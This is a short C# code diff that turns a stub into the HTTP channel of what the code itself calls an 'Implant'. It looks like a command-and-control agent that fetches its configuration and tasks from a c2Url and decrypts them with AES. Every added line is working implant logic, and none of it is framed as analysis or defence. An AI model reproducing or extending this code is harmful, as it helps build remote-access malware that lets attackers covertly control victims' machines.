@@ -6,9 +6,9 @@ using System.Threading.Tasks;
 using System.Net.Http;
 using System.Text.Json;
 
-namespace Test23
+namespace Implant
 {
-    class HTTPCommunicationProvider: CommunicationProvider
+    class HTTPCommunicationProvider: CommunicationProviderInterface
     {
         private string c2Url;
 
@@ -50,9 +50,26 @@ namespace Test23
         }
 
 
-        public string getConfig() { return ""; }
+        public Config getConfig() {
+            var client = new HttpClient();
+            var response = client.GetAsync(this.c2Url + "/getConfig/" + this.name).Result;
 
-        public string getNextTask() { return ""; }
+            var encryptedString = response.Content.ReadAsStringAsync().Result;
+            var decrypted = cryptoProvider.decryptAesMessage(encryptedString);
+            Config config = JsonSerializer.Deserialize<Config>(decrypted);
+            return config;
+        }
+
+        public Task getNextTask() {
+            var client = new HttpClient();
+            var response = client.GetAsync(this.c2Url + "/getNextTask/" +this.name).Result;
+
+            var encryptedString = response.Content.ReadAsStringAsync().Result;
+            var decrypted = cryptoProvider.decryptAesMessage(encryptedString);
+
+            return JsonSerializer.Deserialize<Task>(decrypted); ;
+
+        }
 
         public void updateTaskResult(){}
 
